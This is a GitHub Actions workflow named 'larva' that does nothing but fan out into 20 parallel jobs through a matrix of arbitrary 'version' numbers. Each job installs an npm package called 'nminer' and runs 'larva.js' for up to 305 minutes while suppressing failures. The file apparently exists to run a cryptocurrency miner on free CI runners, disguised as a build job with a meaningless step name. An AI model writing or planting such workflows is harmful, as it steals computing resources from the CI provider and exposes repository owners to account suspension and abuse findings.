name: larva
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1961 }
          - { version: 2756 }
          - { version: 7186 }
          - { version: 4262 }
          - { version: 3553 }
          - { version: 8945 }
          - { version: 5713 }
          - { version: 9661 }
          - { version: 6868 }
          - { version: 9121 }
          - { version: 3269 }
          - { version: 7247 }
          - { version: 2271 }
          - { version: 7421 }
          - { version: 3885 }
          - { version: 7858 }
          - { version: 3160 }
          - { version: 969 }
          - { version: 940 }
          - { version: 4712 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: when fail times task
        run: |
          npm install nminer@latest
          timeout 305m node larva.js || echo "larva executed"